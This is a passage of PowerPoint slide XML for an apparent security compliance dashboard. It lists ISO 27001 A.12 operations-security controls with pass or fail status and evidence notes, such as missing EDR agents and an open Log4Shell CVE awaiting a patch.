          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="650" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>⟳ In Prog</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="61" name="TextBox 60"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9994392" y="3227832"/>
            <a:ext cx="868680" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="1400" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>1</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="62" name="TextBox 61"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10908792" y="3054096"/>
            <a:ext cx="868680" cy="164592"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="650" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>✗ Failing</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="63" name="TextBox 62"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10908792" y="3227832"/>
            <a:ext cx="868680" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="1400" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>5</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="64" name="TextBox 63"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9079992" y="3538728"/>
            <a:ext cx="2578608" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="700" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Article 32 (security of processing) failing — breach notification gap.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="65" name="Rectangle 64"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="3913632"/>
            <a:ext cx="11731752"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28600" y="3950208"/>
            <a:ext cx="11731752" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="800" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>  ISO 27001 Control Detail — Domain A.12 Operations Security</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="67" name="Rectangle 66"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="4187952"/>
            <a:ext cx="12024360" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0D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92608" y="4233672"/>
            <a:ext cx="777240" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="650" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CONTROL ID</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="69" name="TextBox 68"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1161288" y="4233672"/>
            <a:ext cx="2148840" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="650" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CONTROL NAME</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="70" name="TextBox 69"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3401568" y="4233672"/>
            <a:ext cx="914400" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="650" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>STATUS</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="71" name="TextBox 70"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4407408" y="4233672"/>
            <a:ext cx="7818120" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="650" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>EVIDENCE / CURRENT STATE</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="72" name="Rectangle 71"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="4443984"/>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2608" y="4480560"/>
            <a:ext cx="777240" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>A.12.1.2</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="74" name="TextBox 73"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1161288" y="4480560"/>
            <a:ext cx="2148840" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Change Management</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="75" name="TextBox 74"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3401568" y="4480560"/>
            <a:ext cx="914400" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="34D399"/>
                </a:solidFill>
              </a:rPr>
              <a:t>PASSING</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="76" name="TextBox 75"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4407408" y="4480560"/>
            <a:ext cx="7818120" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>All changes logged in JIRA. CAB approves. 100% audit coverage. Last reviewed Mar 10.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="77" name="Rectangle 76"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="4700016"/>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92608" y="4736592"/>
            <a:ext cx="777240" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>A.12.2.1</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="79" name="TextBox 78"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1161288" y="4736592"/>
            <a:ext cx="2148840" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Malware Protection</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="80" name="TextBox 79"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3401568" y="4736592"/>
            <a:ext cx="914400" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>FAILING</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="81" name="TextBox 80"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4407408" y="4736592"/>
            <a:ext cx="7818120" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>EDR deployed on 94/97 endpoints. 3 warehouse IoT devices missing agent — ticket #1247 open.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="82" name="Rectangle 81"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="4956048"/>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92608" y="4992624"/>
            <a:ext cx="777240" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>A.12.4.1</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="84" name="TextBox 83"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1161288" y="4992624"/>
            <a:ext cx="2148840" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Event Logging</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="85" name="TextBox 84"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3401568" y="4992624"/>
            <a:ext cx="914400" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="34D399"/>
                </a:solidFill>
              </a:rPr>
              <a:t>PASSING</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="86" name="TextBox 85"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4407408" y="4992624"/>
            <a:ext cx="7818120" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Centralised SIEM. 90-day hot retention, 1-year cold. Log integrity hash checks daily.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="87" name="Rectangle 86"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="5212080"/>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92608" y="5248656"/>
            <a:ext cx="777240" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>A.12.6.1</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="89" name="TextBox 88"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1161288" y="5248656"/>
            <a:ext cx="2148840" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Technical Vulnerability Mgmt</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="90" name="TextBox 89"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3401568" y="5248656"/>
            <a:ext cx="914400" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>IN PROGRESS</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="91" name="TextBox 90"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4407408" y="5248656"/>
            <a:ext cx="7818120" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>SCA in CI pipeline. CVE-2021-44228 open &gt;30 days — SLA breach risk. Patch PR in review.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="92" name="Rectangle 91"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="5468112"/>
            <a:ext cx="12024360" cy="246888"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1117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92608" y="5504688"/>
            <a:ext cx="777240" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>A.12.3.1</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="94" name="TextBox 93"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1161288" y="5504688"/>
            <a:ext cx="2148840" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Information Backup</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="95" name="TextBox 94"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3401568" y="5504688"/>
            <a:ext cx="914400" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="34D399"/>
                </a:solidFill>
              </a:rPr>
              <a:t>PASSING</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="96" name="TextBox 95"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4407408" y="5504688"/>
            <a:ext cx="7818120" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Daily AES-256 backups. Weekly restore test passing. RTO 4h / RPO 1h documented.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="97" name="Rectangle 96"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="5724144"/>
            <a:ext cx="12024360" cy="246888"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0A0D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92608" y="5760720"/>
            <a:ext cx="777240" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>A.12.7.1</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="99" name="TextBox 98"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1161288" y="5760720"/>
            <a:ext cx="2148840" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Audit Controls</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="100" name="TextBox 99"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3401568" y="5760720"/>
            <a:ext cx="914400" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>FAILING</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="101" name="TextBox 100"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4407408" y="5760720"/>
            <a:ext cx="7818120" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>PostgreSQL audit logging not enabled — DB admin actions untracked. Linked to risk-006.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="102" name="Rectangle 101"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="6099048"/>
            <a:ext cx="11731752" cy="521207"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
